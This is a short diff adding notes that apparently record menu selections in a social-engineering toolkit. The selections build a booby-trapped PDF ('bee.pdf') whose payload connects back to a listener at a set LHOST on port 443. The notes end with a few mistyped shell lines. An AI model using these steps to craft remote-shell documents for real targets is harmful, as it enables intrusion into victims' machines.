@@ -1,0 +1,17 @@
+1
+1
+2
+13
+2
+2
+IP address or URL (www.ex.com) for the payload listener (LHOST) [192.168.141.130]:
+Port to connect back on [443]:
+2
+bee.pdf
+(new terminal)
+sudo sucs
+cs .set
+ls
+
+
+
